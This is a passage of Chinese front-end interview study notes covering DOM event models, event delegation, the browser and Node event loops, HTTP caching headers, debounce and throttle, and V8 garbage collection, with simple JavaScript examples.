- 事件处理器通过HTML属性（如 `onclick`）或直接在JavaScript中通过对象属性（如 `element.onclick`）赋值来添加。
- 每个事件类型只能指定一个处理程序。
- 事件处理程序在全局作用域中执行。

**案例**:
HTML中直接使用事件处理属性：

```html
<button onclick="alert('Clicked DOM0 Style!')">Click Me</button>
```

JavaScript中通过对象属性：

```javascript
var btn = document.getElementById('myButton');
btn.onclick = function() {
    alert('Clicked DOM0 Style!');
};
```

### DOM2级事件模型

**特点**:

- 引入了`addEventListener`和`removeEventListener`方法。
- 支持同一事件多个处理程序。
- 引入了事件流的概念，包括捕获阶段和冒泡阶段。
- 事件对象在所有处理程序中可用。

**案例**:

```javascript
var btn = document.getElementById('myButton');
btn.addEventListener('click', function(event) {
    alert('Clicked DOM2 Style!');
}, false);
```

这里的`false`参数指明事件处理程序在事件冒泡阶段执行。如果设置为`true`，则在捕获阶段执行。

### DOM3级事件模型（了解）

**特点**:

- 在DOM2的基础上增加了对于用户界面事件、突变事件等的更复杂处理。
- 允许创建和分发自定义事件。
- 对于某些事件提供了更细粒度的控制，例如可以区分重复按键事件。

**案例**:
创建一个自定义事件并分发它：

```javascript
var btn = document.getElementById('myButton');
var event = document.createEvent('CustomEvent');
event.initCustomEvent('myCustomEvent', true, true, {'data': 'myData'});
btn.addEventListener('myCustomEvent', function(e) {
    alert('Custom event triggered with data: ' + e.detail.data);
});
btn.dispatchEvent(event);
```

在这个例子中，我们创建了一个名为`myCustomEvent`的自定义事件，并且触发它，同时为它传递了一些附加数据。

### 综合说明

不同级别的DOM事件模型代表了浏览器事件处理能力的演进。DOM0级，虽然不是W3C标准，却建立了Web事件处理的基础；DOM2级进一步标准化了事件处理机制，并引入了事件流，广泛应用在现代Web开发中；而DOM3级则提供了扩展事件处理功能，更好地服务于复杂的应用场景。随着Web技术的不断演进，这些模型仍在被进一步改进和更新。

## 事件绑定

### HTML标签直接写

```html 
<button onclick="alert('Clicked DOM0 Style!')">Click Me</button>
```

### elem.on\<event>

DOM元素 获取dom元素，elem.on\<event>绑定

```javascript
var btn = document.getElementById('myButton');
btn.onclick = function() {
    alert('Clicked DOM0 Style!');
};
```

### addEventListener

`addEventListener` 方法是DOM事件模型中的核心方法，用于在文档中的元素上绑定事件处理函数。以下是该方法的基本用法和示例。

#### 语法

```javascript
element.addEventListener(event, handler, options);
```

- `element` 是要绑定事件的DOM元素。

- `event` 是事件的名称（例如 `'click'`, `'mouseover'`）。

- `handler` 是当事件触发时执行的函数。

- `options`是一个可选参数，可以是一个布尔值或者是一个对象。

  - 如果是布尔值，那么true表示事件处理程序在捕获阶段执行，false（或省略）表示事件处理程序在冒泡阶段执行。

  - 如果是对象，它可以包含几个字段：

    - `capture`: 布尔值，和单独的布尔值用法相同。

    - `once`: 布尔值，如果为 `true`，处理程序将只调用一次然后自动移除。

    - `passive`: 布尔值，如果为 `true`，表明处理程序不会调用 `preventDefault()`。

注意：在旧的浏览器版本中，`options` 参数不被支持。

#### 示例

```javascript
// 获取按钮元素
var button = document.getElementById('myButton');

// 定义事件处理函数
function alertClick() {
    alert('Button clicked!');
}

// 为按钮元素添加点击事件监听
button.addEventListener('click', alertClick, false);
```

在这个例子中，我们为一个按钮元素添加了一个点击事件的监听器。当按钮被点击时，`alertClick` 函数将被执行，并且由于第三个参数是 `false`，该事件监听器将在事件冒泡阶段被调用。

如果你只想让事件处理程序运行一次，可以这样做：

```javascript
button.addEventListener('click', function() {
    alert('Button clicked and will not alert again!');
}, { once: true });
```

在这个更新的示例中，使用 `once` 选项是为了确保事件处理函数只执行一次。

#### 移除事件监听器

要移除由 `addEventListener` 添加的事件监听器，你可以使用 `removeEventListener` 方法。此方法的使用与 `addEventListener` 类似，需要指定相同的事件名称和处理函数的引用：

```javascript
button.removeEventListener('click', alertClick, false);
```

只有完全匹配添加监听器时使用的参数，`removeEventListener` 才会成功移除对应的事件监听器。这也意味着你不能移除匿名函数作为监听器的事件。

## 事件对象

事件对象是一个在事件发生时由浏览器创建并传递给事件处理程序的对象，它包含了关于该事件的所有详细信息。事件处理程序可以通过参数获取到这个对象，通常命名为`event`或者`e`。

### 事件对象的主要属性和方法：

1. **type**:
   返回事件的类型（例如`'click'`, `'mouseover'`）。
2. **target**:
   返回触发事件的元素。在事件冒泡的过程中，它始终指向最初触发事件的元素。
3. **currentTarget**:
   返回当前正在处理事件的元素的引用，这通常是添加了事件监听器的那个元素。就是执行当前回调函数的元素。
4. **preventDefault()**:
   方法用于取消事件的默认行为，如果事件可以被取消的话。例如，阻止默认的表单提交行为。
5. **stopPropagation()**:
   方法用于停止事件的进一步传播，阻止它继续冒泡到父节点或捕获至子节点。
6. **stopImmediatePropagation()**:
   除了具有`stopPropagation()`的效果外，此方法还可以阻止当前元素上的其他事件监听器被调用。
7. **bubbles**:
   布尔值，表明事件是否会冒泡。
8. **cancelable**:
   布尔值，表明事件的默认行为是否可以被`preventDefault()`取消。
9. **defaultPrevented**:
   布尔值，如果事件的默认行为已经被取消，则返回`true`。
10. **clientX / clientY**:
    对于鼠标事件，返回鼠标指针的水平和垂直坐标（相对于浏览器窗口）。
11. **pageX / pageY**:
    对于鼠标事件，返回鼠标指针的水平和垂直坐标（相对于整个页面）。
12. **keyCode**:
    已废弃。曾经用于`keydown`和`keyup`事件，返回被按下的键的编码。现在一般推荐使用`key`。
13. **key**:
    对于键盘事件，返回被按下的键的值。
14. **altKey**, **ctrlKey**, **shiftKey**, **metaKey**:
    在事件发生时，返回相应的修饰键是否也被按下。

### 示例

下面是一个典型的使用事件对象的例子，我们添加了一个点击事件的监听器，并在处理函数中使用了事件对象：

```javascript
button.addEventListener('click', function(event) {
    
    // 阻止按钮默认的提交行为
    event.preventDefault();

    // 输出点击的元素（通常是button）
    console.log('Event type is:', event.type);
    console.log('Target element is:', event.target);
    console.log('Current element is:', event.currentTarget);

    // 假设这是一个复选框，我们想检查Shift键是否在点击时被按下
    if(event.shiftKey) {
        console.log('Shift key is pressed.');
    }
});
```

在这个例子中，我们使用了事件对象的`preventDefault`方法来取消按钮的默认行为，并通过`type`、`target`、`currentTarget`和`shiftKey`等属性来获取事件详细信息

## 事件触发

事件触发的过程是指在浏览器中，当一个元素发生某种交互行为（如点击、鼠标移动、键盘输入等）时，如何通知其他元素或者执行相应的操作的过程。

事件触发的过程一般分为三个阶段**：事件捕获**、**事件目标**和**事件冒泡**。下面我将简要介绍这三个阶段的含义和特点。

- 事件捕获：事件捕获是指从根节点（document）开始，沿着DOM树向下寻找目标元素，途经的每个节点都可以捕获到这个事件。事件捕获的目的是为了在事件到达目标之前就做一些预处理或者拦截。
- 事件目标：事件目标是指触发事件的那个元素，也就是事件捕获阶段的终点。在这个阶段，事件目标可以根据自己的逻辑来响应和处理该事件，比如执行一个函数或者改变自身的样式等。
- 事件冒泡：事件冒泡是指从事件目标开始，沿着DOM树向上回溯，途中经过的每个节点都可以监听和处理该事件。事件冒泡的目的是为了让父节点或者祖先节点也能够感知和参与该事件，实现一些复杂的功能或者逻辑

**如何阻止事件冒泡？**

event.stopPropagation()

## 事件委托

### 1. 事件委托的概念

事件委托本质上是利用了**浏览器事件冒泡**的机制。因为事件在冒泡过程中会上传到父节点，父节点可以通过**事件对象获取到目标节点**（e.target)，因此可以把子节点的**监听函数**定义在父节点上，由父节点的监听函数统一处理多个子元素的事件，这种方式称为事件委托 (事件代理)。

使用事件委托可以不必要为每一个子元素都绑定一个监听事件，这样减少了内存上的消耗。并且使用事性代理还可以实现事件的动态绑定，比如说新增了一个子节点，并不需要单独地为它添加一个监听事件，它绑定的事件会交给父元素中的监听函数来处理。

### 2. 事件委托的特点

#### 优点

1. **内存占用少**：
   不必为每个子元素分别添加事件监听器，从而减轻了浏览器的内存负担。
2. **动态元素管理**：
   对于动态添加的元素，无须添加新的事件监听器，因为父元素上的委托监听器会自动处理这些事件。
3. **简化事件管理**：
   通过在共同父元素上添加一个事件监听器来管理类型相同的多个事件，简化了事件的管理工作。

#### 缺点

1. **不是所有事件都冒泡**：
   某些事件不冒泡（例如`focus`、`blur`），这些事件不能用于事件委托。
2. **可能导致不必要的事件处理**：
   如果不正确使用，事件委托可能会对预期之外的事件响应，因为委派的父元素会捕获所有子元素的同类事件。
3. **事件传播可能会增加处理时间**：
   大量的事件冒泡可能会增加处理时间，尤其是在嵌套很深的DOM结构中。

### 3. 事件委托的场景

1. **列表项点击**：
   例如，对于一个由多个列表项组成的列表，你可以在父列表元素上设置单一事件监听器，而不是在每个列表项上分别设置。
2. **动态元素**：
   对于动态添加到页面中的元素，我们无需每次在它们被创建后分别绑定事件处理程序，只需在其父元素上使用事件委托。
3. **减少内存使用**：
   在管理具有许多子元素的复杂组件时，事件委托能减少需要注册的事件处理程序的数量，这意味着浏览器会使用更少的内存。

### 4. 事件委托的案例

假设有一个任务列表，列表中的任务项是动态添加的：

```html
<ul id="todo-list">
  <li>任务1</li>
  <li>任务2</li>
  <!-- 更多任务项 -->
</ul>
```

我们可以给父`<ul>`元素添加一个点击事件监听器来处理所有的任务项点击事件：

```javascript
document.getElementById('todo-list').addEventListener('click', function(event) {
    if (event.target.tagName === 'LI') {
        console.log('任务项被点击:', event.target.textContent);
        // 执行任务项相关的处理逻辑
    }
});
```

在这段代码中，所有由`<li>`元素触发的点击事件都会冒泡到`<ul>`元素，事件委托使得无须给每个`<li>`添加独立的事件监听器。我们检查`event.target`以确认点击确实发生在任务项上，然后执行相应的逻辑。

## 事件循环

> - [【前端八股文】事件循环-eventloop\_哔哩哔哩\_bilibili](https://www.bilibili.com/video/BV1j14y1j7us/?spm_id_from=333.337.search-card.all.click&vd_source=7ce3f834cb0c7108338f1996b4436d48)
>

### 问题回答

JavaScript是单线程的，为了防止阻塞代码，将JavaScript代码分为同步代码和异步代码。同步代码会按照书写顺序依次执行，形成一个执行栈。异步代码则会交给浏览器辅助线程处理，不会阻塞主线程的执行，当异步任务在完成后，会将回调函数放入一个任务队列中。当执行栈为空时，主线程会从任务队列中取出一个任务，放入执行栈中执行。这个过程就叫做事件循环。同时任务队列又分为宏任务队列和微任务队列，每次事件循环，主线程都会先执行完所有的微任务，再执行一个宏任务。这样可以保证微任务的优先级高于宏任务。

浏览器是一个**多线程的环境**，它有一个主线程和多个辅助线程。主线程负责执行JavaScript代码，而辅助线程负责处理一些耗时的任务，比如网络请求、定时器、事件监听等。这些任务在完成后，会将回调函数放入一个任务队列中，等待主线程空闲时执行。

JavaScript代码分为同步代码和异步代码。同步代码会按照书写顺序依次执行，形成一个执行栈。异步代码则会交给浏览器辅助线程处理，不会阻塞主线程的执行。当执行栈为空时，主线程会从任务队列中取出一个任务，放入执行栈中执行。这个过程就叫做事件循环。

任务队列又分为宏任务队列和微任务队列。宏任务队列包含了一些大的任务，比如网络请求、定时器、用户交互等。微任务队列包含了一些小的任务，比如Promise的回调、MutationObserver的回调等。每次事件循环，主线程都会先执行完所有的微任务，再执行一个宏任务。这样可以保证微任务的优先级高于宏任务。

**注**：

- JavaScript主线程的浏览器的主线程概念相同，指的都是用来执行JavaScript得到线程。

### 一个事件循环的流程

JavaScript 事件循环是一种机制，用来协调单线程执行环境中的同步任务和异步任务。同步任务会直接进入主线程执行，异步任务会进入任务队列等待主线程空闲时执行。任务队列又分为宏任务队列和微任务队列，宏任务队列包括 script、setTimeout、setInterval、I/O、UI 交互事件等，微任务队列包括 Promise、MutationObserver、process.nextTick 等。每个事件循环的开始和结束可以用以下的流程图来表示：

- 事件循环的开始：从宏任务队列中取出最先进入的任务（如果有的话），并执行它。
- 事件循环的结束：检查微任务队列，如果有微任务，则一直执行微任务，直到清空微任务队列。然后更新渲染界面，再回到事件循环的开始。

**总结：事件循环指的是一个宏任务执行的过程，先执行宏任务中的同步代码，再执行微任务队列中的代码，微任务队列为空，表示事件循环结束。**

举个例子，假设当前代码中有以下的宏任务和微任务：

```js
console.log('script start'); // 宏任务1

setTimeout(function() { // 宏任务2
  console.log('timeout1');
}, 10);

new Promise(resolve => { 
  console.log('promise1');
  resolve();
  setTimeout( () => console.log('timeout2'), 10); // 宏任务3
}).then(function() { // 微任务1
  console.log('then1')
})

console.log('script end'); // 宏任务1
```

那么每个事件循环的开始和结束如下：

- 第一个事件循环的开始：执行宏任务1，输出 script start 和 promise1，将宏任务2和3放入宏任务队列，将微任务1和2放入微任务队列，输出 script end。
- 第一个事件循环的结束：执行微任务1，输出 then1，清空微任务队列，更新渲染界面。
- 第二个事件循环的开始：执行宏任务2，输出 timeout1。
- 第二个事件循环的结束：没有微任务，更新渲染界面。
- 第三个事件循环的开始：执行宏任务3，输出 timeout2。
- 第三个事件循环的结束：没有微任务，更新渲染界面。

## 页面的生命周期

这四个事件给开发者提供了不同阶段的文档加载状态，允许在适当的时间点执行相应的逻辑。

### `DOMContentLoaded`

**触发时机：** 当HTML文档被完全加载和解析完成后，不需要等待样式表、图片和子框架加载完成。

**具体使用场景**：

- 初始化页面元素的动态功能，比如滑块、下拉菜单、模态框等。
- 绑定DOM元素事件监听器，如点击、滚动事件等。
- 无需等待图片、CSS文件等加载的DOM操作。

**例子**：

==document==对象

```javascript
document.addEventListener('DOMContentLoaded', () => {
  // 初始化页面交互功能
  initializeSlider();
  // 绑定事件监听器
  document.getElementById('myButton').addEventListener('click', handleButtonClick);
  // 动态修改DOM元素
  document.getElementById('welcome-message').textContent = 'Welcome!';
});
```

### `load`

**触发时机：** 当整个页面加载完毕，包括所有依赖的资源如样式表、脚本、图像。

**具体使用场景**：

- 检查所有资源（包括图片大小）加载状态。
- 执行需要依赖外部资源数据，如图像尺寸的初始化代码。
- 进行网络请求数据与页面渲染完毕后相关的初始化工作。

**例子：**
==window==对象

```javascript
window.addEventListener('load', () => {
  console.log('所有资源加载完成，包括图片和样式表。');
  // 执行依赖于图像尺寸或其他外部资源的代码
});
```

### `beforeunload`

**触发时机：** 当窗口、文档或其资源即将卸载时触发。

**使用场景：** 

- 提示用户保存修改后未提交的表单数据。
- 确认用户是否真的要离开当前进行中的任务（例如，正在播放的视频游戏、写作或编辑工作）。
- 检测尚未保存的更改并提醒用户。

**例子：**

```javascript
window.addEventListener('beforeunload', (event) => {
  // 提示用户是否确定离开页面
  event.returnValue = '您可能有未保存的更改！';
});
```

### `unload`

**触发时机：** 当文档正在被卸载时触发。

**使用场景：** 

- 释放页面使用的资源，例如关闭web socket连接或清除定时器。
- 进行数据统计的发送，如发送页面停留时间的统计信息。

**例子：**

```javascript
window.addEventListener('unload', () => {
  // 页面卸载，进行清理操作
  console.log('页面正在卸载...');
});
```

`DOMContentLoaded` 和 `load` 是两个在不同阶段触发的事件，`DOMContentLoaded` 事件在文档结构已经加载完毕之后立即发生，这使得它非常适合去初始化那些不需要依赖于其他资源的JavaScript代码，比如绑定事件处理函数。而`load`事件发生得更晚，它确保了所有的资源都已经可用，比如图片已经加载完毕，所以它适合那些需要依赖外部资源大小或者状态的初始化代码。

要注意的是，`beforeunload` 和 `unload` 事件可能由于浏览器的安全限制，在现代的Web开发中并不总是可靠，尤其是执行异步操作时，因此其使用场景可能受到一定限制。

## 宏任务微任务

> [【前端八股文】事件循环-宏任务和微任务\_哔哩哔哩\_bilibili](https://www.bilibili.com/video/BV1G84y1B7hZ/?spm_id_from=333.788&vd_source=7ce3f834cb0c7108338f1996b4436d48)

### 宏任务

- script代码块
- 两个定时器
- Ajax，Fetch
- 事件绑定
- I/O操作

### 微任务

- Promise中的then，catch等方法
- process.nextTick （node）
- setImmediate (node)
- Async/Await
- MutationObserver

## 执行栈

- [变量提升：JavaScript代码是按顺序执行的吗 | 浏览器工作原理与实践 (poetries.top)](https://blog.poetries.top/browser-working-principle/guide/part2/lesson07.html#变量提升-hoisting)
- [栈空间和堆空间：数据是如何存储的 | 浏览器工作原理与实践 (poetries.top)](https://blog.poetries.top/browser-working-principle/guide/part3/lesson12.html)

## Node事件循环

> [面试题：说说事件循环机制(满分答案来了)-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1601176)

- 定时器检测阶段(timers)：本阶段执行 timer 的回调，即 setTimeout、setInterval 里面的回调函数。

- I/O事件回调阶段(I/O callbacks)：执行延迟到下一个循环迭代的 I/O 回调，即上一轮循环中未被执行的一些I/O回调。

- 闲置阶段(idle, prepare)：仅系统内部使用。

- 轮询阶段(poll)：检索新的 I/O 事件；执行与 I/O 相关的回调（几乎所有情况下，除了关闭的回调函数，那些由计时器和 setImmediate() 调度的之外），其余情况 node 将在适当的时候在此阻塞。

  如果当前已经存在定时器，而且有定时器到时间了，拿出来执行，eventLoop 将回到 timers 阶段。

  如果没有定时器, 会去看回调函数队列。

  - 如果 poll 队列不为空，会遍历回调队列并同步执行，直到队列为空或者达到系统限制
  - 如果 poll 队列为空时，会有两件事发生
    - 如果有 setImmediate 回调需要执行，poll 阶段会停止并且进入到 check 阶段执行回调
    - 如果没有 setImmediate 回调需要执行，会等待回调被加入到队列中并立即执行回调，这里同样会有个超时时间设置防止一直等待下去,一段时间后自动进入 check 阶段。

- 检查阶段(check)：setImmediate() 回调函数在这里执行

- 关闭事件回调阶段(close callback)：一些关闭的回调函数，如：socket.on('close', ...)。

# 浏览器缓存

> - [HTTP 缓存 - HTTP | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching)
>
> - [你知道304吗？图解强缓存和协商缓存 - 掘金 (juejin.cn)](https://juejin.cn/post/6974529351270268958#heading-16)
>
>   有个小错误，HTML文件可以被缓存

## 强缓存

强缓存是指浏览器直接根据本地缓存响应请求，而不需要与服务器进行通信。强缓存可以通过以下HTTP响应头实现：

#### Expires

这是HTTP/1.0中的缓存控制，它值为一个绝对时间的GMT格式的字符串。如果用户的本地时间小于Expires指定的时间，那么直接使用缓存内容，不向服务器发起请求。

不过，Expires 头有一些缺点，比如它指定的是一个绝对时间，如果客户端的时钟偏差较大，就可能导致缓存行为不准确。因此，现代的Web应用更倾向于使用Cache-Control头，它提供了更灵活的缓存控制机制，例如max-age指定从当前时间开始的最大缓存时间。

#### Cache-Control

在HTTP/1.1中引入更灵活的缓存控制头，如`Cache-Control: max-age=3600`表示资源可以被缓存并且是新鲜的3600秒。有了`Cache-Control`后，`Expires`通常就不再使用，因为`Cache-Control`提供了更精确的控制。

#### TIPS

如果强缓存有效，浏览器不会向服务器发送请求，状态码通常是200（从缓存读取）。

在强缓存有效的情况下，浏览器会直接从本地缓存中读取资源。这个过程是在客户端本地完成的，所以不涉及网络请求，也就没有状态码。但是，为了开发者调试方便，浏览器开发者工具中可能会显示 **200** 状态码，并且旁边通常会有一个标记，如 `from cache` 或 `from disk/memory cache`，以指示资源是从缓存中获取的。

## 协商缓存

当强缓存过期或无效时，浏览器会向服务器发送请求，进行缓存协商。浏览器将保存的缓存标识发送给服务器，由服务器确定这个缓存是否仍然可以使用。这种方式涉及到以下HTTP头：

#### Last-Modified / If-Modified-Since

`Last-Modified`是服务器在响应中发送的，表示资源最后一次修改的时间。浏览器下次请求时，会带上头`If-Modified-Since`，值为`Last-Modified`的值。服务器将`If-Modified-Since`与资源的当前最后修改时间对比，若时间一致，返回304状态码和空的响应体，浏览器继续使用缓存。

#### ETag / If-None-Match

`ETag`是资源的一个唯一标识符，服务器通过某种算法根据资源内容生成。`If-None-Match`头是浏览器基于旧的ETag发起请求时携带的，服务器会比较`ETag`和资源的当前ETag。如果两者一致，说明资源未改变，服务器返回304状态并省略响应体，浏览器使用缓存的版本。

协商缓存虽然会发起HTTP请求，但如果服务器告知内容未改变，可以避免下载资源，达到节省带宽的目的。

## 浏览器缓存机制



## cache-control

设置方式：`Cache-Control: max-age=0, must-revalidate`

### 重点

- no-cache：表示不直接使用缓存，而是先向服务器验证缓存是否最新，如果最新则使用缓存，否则重新下载。【类似于只使用协商缓存】

- no-store：表示不使用任何缓存，每次都从服务器获取最新的数据。

- max-age=`<seconds>`：表示缓存的最大有效时间，超过这个时间后缓存就过期，单位是秒。

- public：表示响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存，即使是通常不可缓存的内容。

- private：表示响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）。

### 其他

- must-revalidate：表示一旦缓存过期，必须向服务器重新验证，否则不能使用缓存。
- proxy-revalidate：与 must-revalidate 作用相同，但它仅适用于共享缓存（例如代理），并被私有缓存忽略。
- no-transform：不得对资源进行转换或转变。Content-Encoding、Content-Range、Content-Type 等 HTTP 头不能由代理修改。
- only-if-cached：表示客户端只接受已缓存的响应，并且不要向原始服务器检查是否有更新的拷贝。

## Etag和last modefined

### last modefined问题

- **Last-Modified**只能精确到秒，秒之内的内容更新Etag才能检测。
- **Last-Modified**不能处理文件内容没有变化但是修改时间变了的问题。文件有时会定时重新生成相同内容，Last-Modified不能很好辨别

### Etag问题

- Etag需要服务器额外计算哈希值，消耗一定的CPU和内存资源。
- Etag的生成算法可能因为服务器的不同而不同，导致同一个资源在不同的服务器上有不同的Etag值，这样就会影响缓存的命中率和一致性。
- Etag的生成算法可能因为资源的动态性而不同，导致一些动态生成的资源，如PHP、JSP等，每次都会产生不同的Etag值，这样就会失去缓存的意义和作用。

### 同时使用

Etag和last modified可以同时使用，服务器会优先验证Etag，如果Etag不匹配，则再验证last modified。这样可以提高缓存控制的效率和准确性。

## 哪些资源被缓存？

浏览器缓存机制主要用来存储从服务器上下载的资源，以便在下次需要时快速获取，避免重复下载。通常被浏览器缓存的资源包括但不限于以下类型：

1. **HTML文档**：作为网页的结构基础。
2. **CSS样式表**：用于页面的样式布局。
3. **JavaScript文件**：提供网页的交互功能。
4. **图片文件**：如JPEG、PNG、GIF等格式的图片。
5. **字体文件**：如WOFF、TTF等格式的Web字体。
6. **JSON数据**：通常用于前后端交互的数据格式。
7. **Multimedia**：如视频和声音文件。
8. **其他静态资源**：如SVG图形、XML数据文件等。

浏览器可能将缓存的资源存储在硬盘或内存中，选择存储位置取决于以下因素：

1. **资源大小**：
   - 大文件（大图片、视频或音乐文件）通常存储在硬盘中
   - 小文件可能存储在内存中，以便更快地访问。
2. **访问频率**：
   - 经常访问的资源（样式表（CSS）和脚本（JavaScript））可能被存储在内存中，以减少读写硬盘的时间。
   - 如果资源不是经常变化的，如某些不怎么修改的JavaScript库或样式表，那么它们可以存储在硬盘中，这些资源即便在浏览器关闭重新打开后也可能仍然有效。
3. **大量不同页面共享的资源**：
   例如，网站的Logo，可能不是经常更新，并且会在不同页面上使用，这样的资源适合存储在硬盘以供未来获取。
4. **临时文件**：
   某些资源只在短时间内频繁访问，如用户浏览时生成的缩略图、预览等，这些通常存储在内存中，被认为是“短暂”的或“临时”的数据。
5. **当前计算机的资源**：如果系统内存足够，浏览器可能更倾向于使用内存缓存，反之则使用硬盘。

## 刷新方式对于缓存的影响

### 正常操作

**定义：** 地址栏输入 `url` ，跳转链接，前进后退等。

**对缓存的影响：** 强制缓存有效，协商缓存有效。

### 手动刷新

**定义：**  `F5` ，点击刷新按钮，右击菜单刷新。

**对缓存的影响：** 强制缓存失效，协商缓存有效。

### 强制刷新

**定义：** `ctrl` + `F5` 。

**对缓存的影响：** 强制缓存失效，协商缓存失效。

# 浏览器优化

性能评估指标和性能优化方式

## 防抖和节流

### 概念

当多次执行某一动作，进行函数调用次数的限制，节省资源；

### 区别/场景

#### 防抖

在事件触发n秒后执行函数，如果在n秒内再次触发，重新计时

#### 节流

多次触发事件时，在n秒时间内，只执行一次回调函数。

#### 区别

函数节流不管事件触发有多频繁，都会保证在规定时间内一定会执行一次真正的事件处理函数，而函数防抖只是在最后一次事件后才触发一次函数。

#### **函数防抖的应用场景**

连续的事件，只需**触发一次回调**的场景有：

- 搜索框输入：当用户在搜索框中输入关键词时，需要在用户停止输入一定时间后才执行搜索函数，而不是每次输入都触发搜索。
- 表单验证：当用户在表单中输入数据时，需要在用户停止输入一定时间后才执行验证函数，而不是每次输入都触发验证
- 按钮点击：当用户点击一个按钮时，需要在用户停止点击一定时间后才执行按钮的功能，而不是每次点击都触发功能。

#### **函数节流的应用场景**

节流适用于需要按照固定频率响应事件的场景：

- 滚动加载，加载更多或滚到底部监听，window.onscroll和滑到底部自动加载更多

- 调整窗口大小Resize：当用户调整浏览器窗口大小时，需要按照一定的时间间隔重新计算页面的布局，而不是每次改变都触发计算。这样可以避免频繁的DOM操作和页面重绘，提高页面的性能和流畅度。
- 鼠标的mousemove、mouseover

### 手写

## 8.浏览器的性能优化

见面经，主要是从渲染的角度上来看

下面的其他的相关内容

[day12 简述浏览器的渲染过程及性能优化 - 掘金 (juejin.cn)](https://juejin.cn/post/7064518416836591629?from=search-suggest)

## 浏览器渲染优化

# V8引擎垃圾回收

> - [详解 Chrome 「V8 」引擎，让你更懂JavaScript ! - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/441313455)
>
> - https://github.com/yacan8/blog/issues/33
>
> - https://jinlong.github.io/2016/05/01/4-Types-of-Memory-Leaks-in-JavaScript-and-How-to-Get-Rid-Of-Them/
>
> - https://www.cnblogs.com/LuckyWinty/p/11739573.html

## 两种垃圾回收算法

标记-清除（Mark-and-Sweep）法和引用计数（Reference Counting）法是两种常见的垃圾回收（Garbage Collection, GC）机制，用于自动管理编程语言中的内存。

### 标记-清除法

标记-清除法是一种常见的垃圾回收机制，工作流程通常分为两个阶段：

1. **标记（Mark）**：垃圾回收器遍历所有可达的（reachable）对象，通常从根对象（如全局对象、堆栈中的局部变量等）开始，对这些对象进行标记。
2. **清除（Sweep）**：垃圾回收器再次遍历堆内存，清理掉那些没有标记的对象，即那些不可达的对象，然后回收它们占用的内存空间。

这种方法克服了引用计数法在循环引用上的不足，标记-清除法能够识别并回收循环引用结构中的死对象。

### 引用计数法

引用计数法是最早的自动垃圾回收机制之一。它的基本思路是：

- 跟踪每个对象被引用的次数。
- 当对象的引用次数降为零时，说明没有任何活动的部分正在使用该对象，因此可以将其内存释放。

引用计数法的一个主要问题是循环引用。即如果两个对象互相引用，即使它们已经不再被其他活动对象所引用，它们的引用计数也不会降到零，因此无法被自动回收。

## 栈内存垃圾回收

直接随着执行上下文销毁

## 堆内存垃圾回收

V8 把堆分成两个区域——新生代和老生代，新生区通常只支持 1～8M 的容量，而老生区支持的容量就大很多了。对于这两块区域，V8 分别使用两个不同的垃圾回收器，以便更高效地实施垃圾回收。

- 副垃圾回收器，主要负责新生代的垃圾回收。
- 主垃圾回收器，主要负责老生代的垃圾回收。

### 副垃圾回收器

V8引擎的副垃圾回收器主要负责新生代（new space）的垃圾回收。新生代是指那些存活时间较短的对象所在的内存区域。V8将新生代的堆内存分为两个等大的空间：from空间和to空间。在垃圾回收过程中，它主要采用Scavenge算法，这是一种复制式垃圾回收算法。

工作流程大致如下：

1. 当新生代的from空间被填满时，副垃圾回收器开始工作。
2. 副垃圾回收器会检查from空间中的对象，并将活动对象（即仍然被应用程序使用的对象）复制到to空间。
3. 复制过程中，活动对象在to空间中会被有序地排列，以便于后续的内存分配。
4. 一旦所有活动对象都被复制到to空间，from空间中剩余的非活动对象（垃圾）就会被释放，从而回收内存。
5. 最后，from空间和to空间的角色互换，原来的to空间成为新的from空间，等待下一轮的垃圾回收。

也正是因为新生区的空间不大，所以很容易被存活的对象装满整个区域。为了解决这个问题，JavaScript ==引擎采用了对象晋升策略，也就是经过两次垃圾回收依然还存活的对象，会被移动到老生区中。==

### 主垃圾回收器

#### 核心流程

V8引擎的主垃圾回收器负责处理老生代（old space）中的对象，即那些经过多次垃圾回收仍然存活的对象。老生代中的对象通常有更长的生命周期，因此，主垃圾回收器采用的算法与副垃圾回收器不同，主要是标记-清除（Mark-Sweep）和标记-整理（Mark-Compact）算法。

主垃圾回收器的工作流程大致如下：

1. **标记阶段**：从一组根对象开始，垃圾回收器遍历堆中所有对象，标记所有从根对象开始可达的对象。这些被标记的对象被视为活动对象，即它们仍然被程序使用。
2. **清除阶段**：在标记完成后，垃圾回收器会遍历堆，清除那些未被标记的对象，因为它们被认为是不可达的，即垃圾。
3. **整理阶段**（可选）：为了解决内存碎片问题，垃圾回收器可能会执行内存整理，将活动对象移动到连续的内存区域，从而优化内存分配。

#### 全停顿

由于垃圾回收是在JS引擎中进行的，而Mark-Compact算法在执行过程中需要移动对象，而当活动对象较多的时候，它的执行速度不可能很快，为了避免JavaScript应用逻辑和垃圾回收器的内存资源竞争导致的不一致性问题，垃圾回收器会将JavaScript应用暂停，这个过程，被称为`全停顿`（stop-the-world）。

在新生代中，由于空间小、存活对象较少、Scavenge算法执行效率较快，所以全停顿的影响并不大。而老生代中就不一样，如果老生代中的活动对象较多，垃圾回收器就会暂停主线程较长的时间，使得页面变得卡顿。

#### 优化方法

在V8引擎中，如果老生代的空间不足以容纳新晋升的对象，或者内存碎片过多影响了性能，主垃圾回收器就会启动，以确保持续的内存使用效率。这个过程可能会暂停JavaScript的执行，因此V8引擎也引入了增量标记（incremental marking）和延迟清理（lazy sweeping）等技术来减少垃圾回收对程序性能的影响。

增量标记（Incremental Marking）和延迟清理（Lazy Sweeping）是V8引擎为了优化垃圾回收过程而采用的技术。它们的目的是减少垃圾回收过程中的停顿时间，从而提高应用程序的性能。

**增量标记**的工作流程如下：

1. **分阶段执行**：增量标记不是一次性完成所有标记工作，而是将标记过程分成多个小阶段。
2. **与应用程序交替**：在每个小阶段，垃圾回收器会标记一部分对象，然后让应用程序继续执行，这样交替进行，直到所有可达对象都被标记完毕。
3. **减少全停顿**：通过这种方式，V8避免了一次性停顿应用程序来完成所有标记的情况，从而减少了单次停顿的时间。

**延迟清理**的工作流程如下：

1. **标记完成后**：在增量标记阶段后，所有活动对象都已经被标记。
2. **按需清理**：垃圾回收器会逐渐清理那些未被标记的对象，而不是一次性清理所有对象。
3. **减少停顿**：这样可以在应用程序运行时逐步进行，进一步减少因垃圾回收引起的停顿。

## 内存泄漏

